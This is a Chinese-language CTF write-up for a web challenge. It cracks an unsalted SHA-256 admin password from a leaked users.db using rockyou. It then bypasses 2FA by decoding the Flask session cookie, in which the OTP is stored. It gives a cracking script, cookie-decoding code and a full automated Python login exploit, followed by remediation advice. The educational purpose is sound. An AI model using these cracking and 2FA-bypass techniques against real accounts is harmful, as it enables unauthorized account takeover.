# No FA — Writeup
 
> 賽事：CyLab Security Academy  
> 類別：Web Exploitation（認證繞過 / 敏感資料存於 client 端）  
> Flag：`academy{n0_r4t3_n0_4uth_359dd2cb}`
 
---
 
## TL;DR（一句話）
 
flag 只給 `admin`，admin 開了 2FA。**第一關**：admin 密碼是無 salt 的 SHA-256，用洩漏的 `users.db` + rockyou 破出 `apple@123`。**第二關**：2FA 的 OTP 被存進 Flask session cookie，而 Flask cookie 只簽章不加密 → 解開自己的 cookie 就讀到 OTP，繞過 2FA。
 
---
 
## 題目
 
拿到兩樣洩漏的檔案：
- `app.py` — Flask 應用原始碼
- `users.db` — SQLite 使用者資料庫
目標：拿到 flag。
 
---
 
## Step 0：先讀源碼找「贏的條件」
 
有源碼的題，先別急著打，先問 **flag 怎麼拿到**。看首頁 route：
 
```python
@app.route("/")
def home():
    if 'username' not in session or session['logged'] == 'false':
        return redirect(url_for('login'))
    flag = "No flag for you!!"
    if session.get('username') == 'admin':     # ← flag 只給 admin
        flag = os.getenv('FLAG')
    return render_template("index.html", flag=flag)
```
 
**結論：我必須以 `admin` 身分登入。**
 
---
 
## Step 1：admin 有幾道關卡？
 
```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    ...
    if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:
        if user['two_fa']:                       # admin: two_fa = 1
            otp = str(random.randint(1000, 9999))
            session['otp_secret'] = otp          # ← OTP 存進 session（埋點）
            session['otp_timestamp'] = time.time()
            session['username'] = username
            session['logged'] = 'false'
            return redirect(url_for('two_fa'))
        else:
            session['logged'] = 'true'
            ...
```
 
查 `users.db`，只有 admin 的 `two_fa = 1`。所以當 admin 要過**兩關**：
 
1. 密碼（SHA-256 比對）
2. OTP（4 位數驗證）
---
 
## Step 2：破第一關 — 密碼
 
`users.db` 的 users 表：
 
| username | password (SHA-256) | two_fa |
|----------|--------------------|--------|
| admin | `c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67` | 1 |
| john.doe | `599a4410e2af69d1585f16d82d4b5f0abf3ad09fa42b9d55d7b7a50671ccf8c1` | 0 |
| ... | ... | 0 |
 
**怎麼認出 hash 類型**：64 個 hex 字元 = 256 bits = SHA-256。code 裡 `hashlib.sha256(password).hexdigest()` 證實，且**無 salt** → 可字典攻擊。
 
用 rockyou 比對：
 
```python
import hashlib
target = "c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67"
with open("rockyou.txt", encoding="latin-1") as f:
    for line in f:
        pw = line.rstrip("\n")
        if hashlib.sha256(pw.encode()).hexdigest() == target:
            print("FOUND:", pw); break
```
 
→ **admin 密碼 = `apple@123`**
 
> 這就是「洩漏資料」的用途：拿到 db，crack 密碼。
 
---
 
## Step 3：破第二關 — OTP（本題精華）
 
OTP 是 email 寄的，收不到。但關鍵在埋點那行：
 
```python
session['otp_secret'] = otp
```
 
出題者把 OTP 存進了 `session`。停下來問一個關鍵問題：
 
> **Flask 的 session 存在哪裡？**
 
答案：**存在 cookie 裡，送到瀏覽器。** 而 Flask 預設 session cookie 是「**簽章但不加密**」：
 
- **簽章**：防止你竄改內容（改了對不上簽章）
- **沒加密**：內容只是 base64，**任何人都能讀**
→ 伺服器等於把 OTP 用明文裝進 cookie 交給你。**解開自己的 cookie 就看到 OTP。**
 
### 這是什麼心法？
 
**Trust Boundary**：秘密放錯了邊。該留在伺服器的東西（OTP），跑到了使用者手上。前端 / cookie 不是信任邊界。
 
---
 
## Step 4：解開 cookie 拿 OTP
 
Flask session cookie 的結構（固定、公開）：
 
```
cookie = base64( zlib壓縮( JSON ) ) . 時間戳 . 簽章
          └──────── payload ────────┘
```
 
要讀回來就是**倒著拆每一層**：切掉簽章 → base64 解碼 →（解壓縮）→ 讀 JSON。
 
### 解法 A：CyberChef（零程式碼）
 
[gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)，recipe 拖兩個積木：
1. `From Base64`
2. `Zlib Inflate`
貼上 cookie 的 payload 部分 → 右邊顯示 JSON，OTP 在 `otp_secret`。
 
### 解法 B：flask-unsign
 
```bash
flask-unsign --decode --cookie '<整串 session cookie>'
```
 
### 解法 C：瀏覽器 Console（不用裝任何東西）
 
在 `/two_fa` 頁面，F12 → Application → Cookies 複製 `session` 值，貼進下面換掉 `PASTE_HERE`：
 
```js
const c = "PASTE_HERE";
(async () => {
  // Flask session = [payload].[時間戳].[簽章]；payload 開頭有 . 代表被壓縮
  let p = (c[0]==='.' ? c.slice(1) : c).split('.')[0];
  let bin = atob(p.replace(/-/g,'+').replace(/_/g,'/') + '==='.slice((p.length+3)%4));
  let bytes = Uint8Array.from(bin, ch => ch.charCodeAt(0));
  if (c[0]==='.') {   // 有壓縮就 inflate（瀏覽器內建）
    const s = new Blob([bytes]).stream().pipeThrough(new DecompressionStream('deflate'));
    bytes = new Uint8Array(await new Response(s).arrayBuffer());
  }
  const data = JSON.parse(new TextDecoder().decode(bytes));
  console.log(data);
  console.log('OTP =', data.otp_secret);
})();
```
 
> 逐行對應：`split('.')[0]` 切掉簽章 → `atob` base64 解碼 → `DecompressionStream` 解壓 → `JSON.parse` 讀出物件。  
> **懂了 cookie 怎麼包起來，拆的 code 幾乎自動長出來。難的是「認出這是 Flask cookie」。**
 
拿到 4 位數 OTP → 填進 `/two_fa` → `session['logged']='true'` → 進首頁 → **flag**。
 
⚠️ OTP 有 120 秒時效（`time.time() - timestamp < 120`），而且每次重登才會換新 OTP。解出來要盡快填。
 
---
 
## 自動化 Exploit
 
```python
import sys, json, base64, zlib, re, requests
 
BASE = sys.argv[1].rstrip('/')
s = requests.Session()
 
# 1) 用破解的密碼登入 → 觸發 2FA，拿到含 OTP 的 cookie
s.post(f"{BASE}/login", data={"username":"admin","password":"apple@123"},
       allow_redirects=False)
 
# 2) 解開自己的 cookie 偷 OTP（不需要 secret key）
cookie = s.cookies.get("session")
def b64d(x): return base64.urlsafe_b64decode(x + '='*(-len(x)%4))
comp = cookie.startswith('.')
payload = (cookie[1:] if comp else cookie).split('.')[0]
raw = b64d(payload)
if comp: raw = zlib.decompress(raw)
otp = json.loads(raw)["otp_secret"]
 
# 3) 交回 OTP → 4) 拿 flag
s.post(f"{BASE}/two_fa", data={"otp": otp})
print(re.search(r'[A-Za-z0-9_]+\{[^}]+\}', s.get(f"{BASE}/").text).group(0))
```
 
---
 
## 兩個漏洞（flag 名字已經在提示）
 
`academy{n0_r4t3_n0_4uth_...}`
 
| 線索 | 漏洞 | 說明 |
|------|------|------|
| `n0_4uth` | **OTP 存於 client 端** | OTP 放進不加密的 session cookie，等於沒有真正的第二因素（本篇解法） |
| `n0_r4t3` | **OTP 無 rate limit** | OTP 只有 4 位數（1000–9999）且驗證端無限次嘗試 → 也可暴力猜 9000 次 |
 
外加：
- **密碼無 salt** → 洩漏即可離線破解
- **secret 存進 session** → Flask session 不加密，不該放任何秘密
---
 
## 修復建議
 
- **OTP 不要放進 session cookie**：存伺服器端（DB / Redis），cookie 只放一個不可逆的 reference id
- **Flask session 不放任何秘密**：session 預設不加密，只簽章
- **OTP 加 rate limit + 嘗試次數上限**：幾次錯誤就鎖定
- **密碼加 salt**：用 bcrypt / argon2，不要裸 SHA-256
- OTP 用足夠長度 + 一次性（用過即失效）
---
 
## 帶走的心法
 
| 心法 | 這題怎麼用 |
|------|-----------|
| **先找贏的條件** | 讀源碼 → flag 只給 admin，目標立刻明確 |
| **拆成關卡逐一破** | admin = 密碼關 + OTP 關，一關一關拆 |
| **Trust Boundary** | OTP 這個秘密被放到 client 端的 cookie，邊界放錯 |
| **認出格式 > 會寫 code** | 認出「Flask cookie」才是關鍵，解碼有 CyberChef / flask-unsign 等現成工具 |
| **洩漏資料的用途** | db 洩漏 = 離線破密碼；無 salt 的 hash 必破 |
 
> **看到 cookie / token，先問一句：「裡面有沒有裝我不該看到的東西？」**
 
---
 
*授權用途：CTF 學習 / 授權滲透測試 / 自己的機器。*
